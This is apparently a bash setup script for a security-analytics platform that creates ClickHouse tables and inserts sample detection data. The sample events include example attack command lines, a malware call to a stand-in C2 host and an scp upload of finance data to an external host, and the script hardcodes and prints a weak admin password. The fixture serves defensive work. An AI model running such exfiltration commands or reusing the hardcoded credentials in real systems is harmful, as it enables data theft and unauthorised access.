#!/bin/bash

# ClickHouse数据库配置脚本
# ClickHouse Database Configuration Script

set -e

echo "📊 配置ClickHouse数据表..."

# 等待ClickHouse启动
echo "⏳ 等待ClickHouse服务启动..."
until curl -s http://localhost:8123/ping > /dev/null; do
    echo "   等待ClickHouse..."
    sleep 2
done

echo "✅ ClickHouse服务已就绪"

# ClickHouse连接参数
CLICKHOUSE_HOST="localhost"
CLICKHOUSE_PORT="8123"
CLICKHOUSE_USER="admin"
CLICKHOUSE_PASSWORD="security123"

# 执行ClickHouse查询
run_query() {
    local query="$1"
    echo "执行: $query"
    
    curl -s -X POST \
        "http://$CLICKHOUSE_HOST:$CLICKHOUSE_PORT/" \
        -u "$CLICKHOUSE_USER:$CLICKHOUSE_PASSWORD" \
        -d "$query" || {
        echo "⚠️  查询执行失败"
        return 1
    }
    echo ""
}

echo ""
echo "🏗️  创建安全分析数据库..."

# 1. 创建数据库
run_query "CREATE DATABASE IF NOT EXISTS security_analysis"

echo ""
echo "📋 创建安全事件表..."

# 2. 创建安全事件表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.security_events (
    event_id String,
    event_type String,
    timestamp DateTime64(3),
    src_ip IPv4,
    dst_ip IPv4,
    username String,
    process_name String,
    file_path String,
    file_hash String,
    domain String,
    url String,
    command_line String,
    risk_score Float32,
    threat_level String,
    is_anomaly Bool,
    anomaly_type String,
    raw_data String,
    created_at DateTime64(3) DEFAULT now64()
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, event_type, risk_score)
SETTINGS index_granularity = 8192
"

echo ""
echo "🎯 创建实体分析表..."

# 3. 创建实体分析表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.security_entities (
    entity_id String,
    entity_type String,
    first_seen DateTime64(3),
    last_seen DateTime64(3),
    risk_score Float32,
    threat_level String,
    status String,
    metadata String,
    event_count UInt32,
    connection_count UInt32,
    created_at DateTime64(3) DEFAULT now64(),
    updated_at DateTime64(3) DEFAULT now64()
) ENGINE = ReplacingMergeTree(updated_at)
PARTITION BY entity_type
ORDER BY (entity_id, entity_type)
SETTINGS index_granularity = 8192
"

echo ""
echo "🔗 创建实体连接表..."

# 4. 创建实体连接表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.entity_connections (
    source_entity_id String,
    source_entity_type String,
    target_entity_id String,
    target_entity_type String,
    relationship_type String,
    confidence Float32,
    first_seen DateTime64(3),
    last_seen DateTime64(3),
    frequency UInt32,
    event_ids Array(String),
    created_at DateTime64(3) DEFAULT now64()
) ENGINE = MergeTree()
PARTITION BY relationship_type
ORDER BY (source_entity_id, target_entity_id, relationship_type)
SETTINGS index_granularity = 8192
"

echo ""
echo "🚨 创建告警表..."

# 5. 创建告警表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.security_alerts (
    alert_id String,
    timestamp DateTime64(3),
    severity String,
    title String,
    description String,
    source_event_id String,
    entities Array(String),
    risk_score Float32,
    status String,
    assigned_to String,
    response_actions Array(String),
    created_at DateTime64(3) DEFAULT now64(),
    resolved_at DateTime64(3)
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, severity, risk_score)
SETTINGS index_granularity = 8192
"

echo ""
echo "📊 创建响应动作表..."

# 6. 创建响应动作表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.response_actions (
    action_id String,
    entity_id String,
    entity_type String,
    action_type String,
    action_details String,
    status String,
    executor String,
    timestamp DateTime64(3),
    result String,
    error_message String,
    created_at DateTime64(3) DEFAULT now64()
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, entity_id, action_type)
SETTINGS index_granularity = 8192
"

echo ""
echo "📈 创建统计分析表..."

# 7. 创建统计分析表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.analysis_statistics (
    date Date,
    hour UInt8,
    total_events UInt32,
    high_risk_events UInt32,
    entities_extracted UInt32,
    connections_expanded UInt32,
    responses_executed UInt32,
    average_processing_time Float32,
    created_at DateTime64(3) DEFAULT now64()
) ENGINE = SummingMergeTree()
PARTITION BY date
ORDER BY (date, hour)
SETTINGS index_granularity = 8192
"

echo ""
echo "🔍 创建威胁情报表..."

# 8. 创建威胁情报表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.threat_intelligence (
    indicator String,
    indicator_type String,
    threat_type String,
    confidence Float32,
    source String,
    description String,
    first_seen DateTime64(3),
    last_seen DateTime64(3),
    is_active Bool,
    tags Array(String),
    created_at DateTime64(3) DEFAULT now64(),
    updated_at DateTime64(3) DEFAULT now64()
) ENGINE = ReplacingMergeTree(updated_at)
PARTITION BY indicator_type
ORDER BY (indicator, indicator_type)
SETTINGS index_granularity = 8192
"

echo ""
echo "📋 创建基线数据表..."

# 9. 创建基线数据表
run_query "
CREATE TABLE IF NOT EXISTS security_analysis.baseline_data (
    entity_id String,
    entity_type String,
    baseline_type String,
    normal_pattern String,
    threshold_values String,
    created_at DateTime64(3) DEFAULT now64(),
    updated_at DateTime64(3) DEFAULT now64()
) ENGINE = ReplacingMergeTree(updated_at)
PARTITION BY entity_type
ORDER BY (entity_id, baseline_type)
SETTINGS index_granularity = 8192
"

echo ""
echo "🔗 创建物化视图..."

# 10. 创建实时统计物化视图
run_query "
CREATE MATERIALIZED VIEW IF NOT EXISTS security_analysis.real_time_stats
ENGINE = SummingMergeTree()
PARTITION BY toYYYYMMDD(timestamp)
ORDER BY (event_type, toStartOfHour(timestamp))
AS SELECT
    event_type,
    toStartOfHour(timestamp) as hour,
    count() as event_count,
    countIf(is_anomaly = 1) as anomaly_count,
    avg(risk_score) as avg_risk_score,
    max(risk_score) as max_risk_score
FROM security_analysis.security_events
GROUP BY event_type, hour
"

# 11. 创建高风险实体视图
run_query "
CREATE MATERIALIZED VIEW IF NOT EXISTS security_analysis.high_risk_entities
ENGINE = ReplacingMergeTree(last_seen)
PARTITION BY entity_type
ORDER BY (entity_id, entity_type)
AS SELECT
    entity_id,
    entity_type,
    risk_score,
    threat_level,
    status,
    last_seen
FROM security_analysis.security_entities
WHERE risk_score >= 70
"

echo ""
echo "📊 插入示例数据..."

# 12. 插入示例数据
run_query "
INSERT INTO security_analysis.security_events VALUES
    ('evt-001', 'malware_detection', '2025-07-30 09:00:00', '192.168.1.100', '45.67.89.123', 'user1', 'malware.exe', 'C:\\temp\\malware.exe', 'abc123...', 'malicious.com', 'http://malicious.com/payload', 'malware.exe -c http://c2.com', 85.5, 'HIGH', true, 'malware_execution', '{\"details\": \"Malware detected\"}', now64()),
    ('evt-002', 'brute_force', '2025-07-30 09:05:00', '203.45.67.89', '192.168.1.10', 'admin', '', '', '', '', '', '', 75.2, 'HIGH', true, 'brute_force_login', '{\"attempts\": 150}', now64()),
    ('evt-003', 'data_exfiltration', '2025-07-30 09:10:00', '192.168.1.50', '8.8.8.8', 'finance_user', 'scp.exe', 'C:\\Finance\\data.xlsx', 'def456...', 'external.com', 'https://external.com/upload', 'scp data.xlsx user@external.com', 65.8, 'MEDIUM', true, 'large_data_transfer', '{\"size\": \"50MB\"}', now64())
"

run_query "
INSERT INTO security_analysis.security_entities VALUES
    ('192.168.1.100', 'ip', '2025-07-30 08:00:00', '2025-07-30 09:00:00', 45.2, 'MEDIUM', 'active', '{\"is_private\": true}', 5, 3, now64(), now64()),
    ('user1', 'user', '2025-07-30 08:30:00', '2025-07-30 09:00:00', 85.5, 'HIGH', 'compromised', '{\"is_admin\": false}', 2, 1, now64(), now64()),
    ('malware.exe', 'file', '2025-07-30 09:00:00', '2025-07-30 09:00:00', 95.0, 'CRITICAL', 'quarantined', '{\"is_executable\": true}', 1, 0, now64(), now64())
"

run_query "
INSERT INTO security_analysis.threat_intelligence VALUES
    ('45.67.89.123', 'ip', 'malware_c2', 0.95, 'ThreatDB', 'Known malware C2 server', '2025-07-29 00:00:00', '2025-07-30 09:00:00', true, ['c2', 'malware'], now64(), now64()),
    ('malicious.com', 'domain', 'phishing', 0.88, 'PhishTank', 'Phishing domain', '2025-07-28 00:00:00', '2025-07-30 09:00:00', true, ['phishing', 'malware'], now64(), now64())
"

echo ""
echo "🔍 验证数据库结构..."

# 13. 验证创建的表
echo "📋 数据库列表:"
run_query "SHOW DATABASES"

echo ""
echo "📊 表列表:"
run_query "SHOW TABLES FROM security_analysis"

echo ""
echo "📈 事件统计:"
run_query "
SELECT 
    event_type,
    count() as count,
    avg(risk_score) as avg_risk_score,
    max(risk_score) as max_risk_score
FROM security_analysis.security_events 
GROUP BY event_type 
ORDER BY count DESC
"

echo ""
echo "🎯 实体统计:"
run_query "
SELECT 
    entity_type,
    count() as count,
    avg(risk_score) as avg_risk_score
FROM security_analysis.security_entities 
GROUP BY entity_type 
ORDER BY count DESC
"

echo ""
echo "🚨 威胁情报统计:"
run_query "
SELECT 
    indicator_type,
    threat_type,
    count() as count
FROM security_analysis.threat_intelligence 
GROUP BY indicator_type, threat_type
"

echo ""
echo "✅ ClickHouse数据库配置完成！"
echo ""
echo "🎯 可以通过以下方式访问ClickHouse:"
echo "   - HTTP: http://localhost:8123"
echo "   - Native: localhost:9001"
echo "   - Play UI: http://localhost:8123/play"
echo "   - 用户名: admin"
echo "   - 密码: security123"